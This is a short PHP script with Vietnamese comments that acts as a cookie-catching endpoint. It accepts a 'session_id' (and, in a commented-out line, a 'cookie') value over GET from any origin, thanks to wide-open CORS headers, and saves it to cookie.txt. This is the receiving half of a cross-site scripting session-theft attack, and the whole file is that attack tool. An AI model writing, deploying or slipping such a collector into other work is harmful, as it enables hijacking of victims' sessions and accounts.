<?php
header('Access-Control-Allow-Origin: *');

header('Access-Control-Allow-Methods: GET, POST');

header("Access-Control-Allow-Headers: *");

//file_put_contents('cookie.txt',$_GET['cookie']);
$number = $_GET['session_id'];
// Kiểm tra xem 'session_id' có giá trị không
if (!empty($number)) {
    // Mở tệp cookie.txt để ghi
    $file = fopen("cookie.txt", "w");
    
    // Ghi giá trị 'session_id' vào tệp cookie.txt
    fwrite($file, $number);
    
    // Đóng tệp
    fclose($file);
    
    echo "Số đã được lưu vào cookie.txt: " . $number;
} else {
    echo "Không có số được truyền vào.";
}
?>
